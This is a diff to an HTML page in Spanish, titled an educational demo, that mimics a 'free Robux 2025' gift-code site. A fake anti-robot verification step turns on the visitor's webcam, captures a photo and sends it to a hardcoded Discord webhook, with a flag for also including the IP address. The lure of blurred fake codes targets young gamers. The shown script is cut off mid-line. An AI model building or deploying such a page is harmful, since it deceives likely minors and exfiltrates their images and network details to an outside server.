@@ -5,9 +5,10 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Robux gratis 2025 — Nuevos códigos (Demo educativa)</title>
   <style>
-    :root{--bg:#0a0f1d;--card:#0f172a;--ink:#e5e7eb;--muted:#94a3b8;--accent:#22c55e;--warn:#f59e0b;--bad:#ef4444;--border:#1f2937}
+    :root{--bg:#0a0f1d;--card:#0f172a;--ink:#e5e7eb;--muted:#94a3b8;--accent:#22c55e;--border:#1f2937}
     *{box-sizing:border-box;font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Cantarell,Noto Sans,Arial}
     body{margin:0;background:linear-gradient(180deg,#0b1022,#0f172a 40%,#0b1022);color:var(--ink);min-height:100svh}
+    .topdebug{background:#111827;color:#e5e7eb;padding:8px 12px;border-bottom:1px solid #1f2937;font-size:14px}
     .container{max-width:980px;margin:auto;padding:24px}
     .card{background:var(--card);border:1px solid var(--border);border-radius:18px;box-shadow:0 12px 30px rgba(0,0,0,.35);overflow:hidden}
     header{padding:18px;border-bottom:1px solid var(--border)}
@@ -21,9 +22,119 @@
     .code kbd{background:#0f1a2f;border:1px solid #2a3b57;border-radius:8px;padding:6px 10px;font-family:ui-monospace,Menlo,Consolas;letter-spacing:.5px}
     .btn{appearance:none;border:0;border-radius:12px;padding:10px 14px;font-weight:700;cursor:pointer}
     .btn.primary{background:var(--accent);color:#052011;box-shadow:0 8px 20px rgba(34,197,94,.35)}
-    .btn.ghost{background:transparent;border:1px solid #334155;color:var(--ink)}
     .muted{color:var(--muted)}
     .blurred{filter:blur(8px)}
-    .overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);display:none;align-items:center;justify-content:center;padding:18px}
+    .overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);display:none;align-items:center;justify-content:center;padding:18px;z-index:50}
     .overlay.show{display:flex}
-    .modal{max-width:640px;width:100%;background:#0f172a;border:1px solid #334155;border-radi
+    .modal{max-width:640px;width:100%;background:#0f172a;border:1px solid #334155;border-radius:16px;padding:18px;box-shadow:0 20px 50px rgba(0,0,0,.5)}
+    .modal h2{margin:0 0 8px}
+    .row{display:flex;gap:10px;flex-wrap:wrap;margin-top:14px}
+    .tag{display:inline-block;border:1px solid #334155;border-radius:999px;padding:6px 10px;font-size:12px;color:#94a3b8;margin-right:8px}
+    .log{font-family:ui-monospace,Menlo,Consolas;background:#0a0f1d;border:1px dashed #334155;border-radius:12px;padding:12px;min-height:110px;white-space:pre-wrap}
+    video,canvas,img{width:100%;border-radius:12px;background:black;display:block}
+    noscript{display:block;background:#fee2e2;color:#7f1d1d;padding:12px;border-left:4px solid #ef4444;margin:12px 0;border-radius:8px}
+  </style>
+</head>
+<body>
+  <div class="topdebug">✅ HTML cargado. Si no ves la tarjeta abajo, el problema es de despliegue/carpeta. Si no funcionan los botones, abre la consola (F12) y mira “Registro”.</div>
+  <noscript>Esta demo requiere JavaScript para funcionar.</noscript>
+
+  <div class="container">
+    <div class="card">
+      <header>
+        <h1>Robux gratis 2025 — Nuevos códigos de regalo</h1>
+        <p>Actualizamos la lista cada semana. ¡Reclama tus códigos antes de que caduquen!</p>
+        <div style="margin-top:8px">
+          <span class="tag">Nuevos 2025</span>
+          <span class="tag">Tiempo limitado</span>
+          <span class="tag">Verificación</span>
+        </div>
+      </header>
+      <main>
+        <section class="panel">
+          <h3 style="margin:6px 0 10px">Códigos disponibles</h3>
+          <div id="codes" class="codes blurred" aria-hidden="true">
+            <div class="code"><span><strong>MEGA-2025-START</strong></span><kbd>HSS7-Q4X2-9P1K</kbd></div>
+            <div class="code"><span><strong>FREE-ROBUX-BOOST</strong></span><kbd>RBLX-7N2K-2M5A</kbd></div>
+            <div class="code"><span><strong>ULTRA-GIFT-2025</strong></span><kbd>U4G-25-LUCKY</kbd></div>
+          </div>
+          <p class="muted" style="margin-top:10px">Los códigos se mostrarán completos tras una verificación rápida.</p>
+          <div class="row">
+            <button id="btn-open" class="btn primary">Verificar y ver códigos</button>
+          </div>
+        </section>
+        <aside class="panel">
+          <h3>Registro</h3>
+          <div id="log" class="log" aria-live="polite"></div>
+        </aside>
+      </main>
+    </div>
+  </div>
+
+  <!-- Consentimiento -->
+  <div id="consentLayer" class="overlay" role="dialog" aria-modal="true">
+    <div class="modal">
+      <h2>Verificación anti robot (consentimiento requerido)</h2>
+      <p>Se activará tu <strong>cámara</strong>, tomaremos <strong>una foto</strong> y la enviaremos al <strong>Discord</strong> de la demo.</p>
+      <label style="display:flex;gap:10px;margin-top:10px">
+        <input id="ck" type="checkbox" />
+        <span>✅ Autorizo activar la cámara, capturar una foto y enviarla a Discord.</span>
+      </label>
+      <div class="row">
+        <button id="btn-consent" class="btn primary" disabled>Dar consentimiento y continuar</button>
+      </div>
+      <p class="muted" style="margin-top:8px">HTTPS requerido.</p>
+    </div>
+  </div>
+
+  <!-- Captura -->
+  <div id="captureLayer" class="overlay" role="dialog" aria-modal="true">
+    <div class="modal">
+      <h2>Capturando…</h2>
+      <video id="video" playsinline autoplay muted hidden></video>
+      <canvas id="canvas" hidden></canvas>
+      <figure id="previewBox" style="display:none;margin-top:10px">
+        <figcaption class="muted">Vista previa local</figcaption>
+        <img id="preview" alt="Vista previa" />
+      </figure>
+      <div class="row">
+        <button id="btn-cancel" class="btn" disabled>Detener cámara</button>
+        <button id="btn-close" class="btn primary" style="display:none">Cerrar</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+  const WEBHOOK = "https://discord.com/api/webhooks/1394955639046017125/-WfN_y9umGx0-PV4GP0FID6mSIGq7NPXy6SQO-CmZRA1LOSppZgKX0IJNyKZisgnwqci";
+  const INCLUIR_IP = true;
+
+  const $ = (id)=>document.getElementById(id);
+  const log = (m)=>{ const el=$("log"); if(!el) return; el.textContent += `\n${new Date().toLocaleTimeString()} — ${m}`; el.scrollTop = el.scrollHeight; };
+
+  let stream = null, lastBlob = null;
+
+  document.addEventListener('DOMContentLoaded', () => {
+    try {
+      const codes = $("codes"), consentLayer = $("consentLayer"), captureLayer = $("captureLayer");
+      const ck = $("ck"), btnOpen = $("btn-open"), btnConsent = $("btn-consent");
+      const btnCancel = $("btn-cancel"), btnClose = $("btn-close");
+      const video = $("video"), canvas = $("canvas"), preview = $("preview"), previewBox = $("previewBox");
+
+      if(!codes || !consentLayer || !captureLayer || !btnOpen || !btnConsent || !video || !canvas || !preview || !previewBox){
+        log("Faltan elementos del DOM. Revisa IDs.");
+        return;
+      }
+
+      const unlock = ()=>{ codes.classList.remove('blurred'); codes.removeAttribute('aria-hidden'); log('Códigos desbloqueados.'); };
+      const openConsent = ()=> consentLayer.classList.add('show');
+      const closeConsent = ()=> consentLayer.classList.remove('show');
+      const openCapture = ()=> captureLayer.classList.add('show');
+      const closeCapture = ()=> captureLayer.classList.remove('show');
+
+      btnOpen.addEventListener('click', openConsent);
+      ck.addEventListener('change', ()=>{ btnConsent.disabled = !ck.checked; });
+
+      // Atajo ñ para desbloquear sin cámara
+      document.addEventListener('keydown', (e)=>{
+        if (!consentLayer.classList.contains('show')) return;
+        if ((e.key||'')
